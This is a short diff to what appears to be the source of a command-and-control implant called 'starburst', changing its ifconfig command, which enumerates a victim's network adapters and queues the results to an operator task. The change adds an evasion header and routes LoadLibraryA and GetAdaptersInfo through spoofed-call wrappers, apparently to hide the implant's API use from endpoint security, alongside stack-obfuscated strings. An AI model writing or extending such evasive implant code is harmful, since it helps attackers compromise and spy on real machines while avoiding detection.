@@ -5,6 +5,7 @@
 #include <config.h>
 #include <strings.h>
 #include <stackstr.h>
+#include <evasion/spoof_dispatch.h>
 
 #ifdef INCLUDE_CMD_IFCONFIG
 
@@ -47,7 +48,7 @@ auto declfn starburst::cmd_ifconfig(
     _In_    Parser*   params
 ) -> void {
     STK_IPHLPAPI(_n);
-    auto h_iphlpapi = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA( _n ) );
+    auto h_iphlpapi = (HMODULE)SCALL( inst, kernel32.LoadLibraryA, _n );
     if ( !h_iphlpapi ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "LoadLibrary iphlpapi failed" ) ) );
@@ -64,7 +65,7 @@ auto declfn starburst::cmd_ifconfig(
     }
 
     ULONG buf_size = 0;
-    pGetAdaptersInfo( nullptr, &buf_size );
+    SCALL_PTR( inst, pGetAdaptersInfo, nullptr, &buf_size );
     if ( buf_size == 0 ) {
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "no adapters" ) ) );
@@ -78,7 +79,7 @@ auto declfn starburst::cmd_ifconfig(
         return;
     }
 
-    if ( pGetAdaptersInfo( adapter_info, &buf_size ) != 0 ) {
+    if ( (DWORD)SCALL_PTR( inst, pGetAdaptersInfo, adapter_info, &buf_size ) != 0 ) {
         inst.heap_free( adapter_info );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "GetAdaptersInfo failed" ) ) );
